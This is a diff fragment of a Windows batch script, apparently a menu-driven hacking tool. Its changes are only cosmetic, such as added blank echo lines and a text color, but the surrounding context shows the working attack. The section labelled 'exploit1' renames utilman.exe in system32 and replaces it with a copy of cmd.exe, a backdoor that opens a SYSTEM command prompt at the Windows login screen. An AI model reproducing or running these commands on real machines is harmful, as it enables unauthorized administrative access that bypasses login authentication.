@@ -97,13 +97,15 @@ goto menu
 :exploit1
 cls
 echo Starting Hack
+echo.
 if exist "c:\windows\system32" (
-  echo System Directory Found
-
+  echo System Directory Found	
   echo Renaming utilman.exe to utilman.old
+  echo.
   ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail
-
+  echo.
   echo Copying cmd.exe to utilman.exe
+  echo.
   copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto :cmdFail
 
   echo -----------------------------------
@@ -285,7 +287,7 @@ timeout /t 5 > nul
 goto menu
 
 :showDinoError
-cls
+color 0C
 echo                __
 echo               / _^)
 echo      _.----._/ /
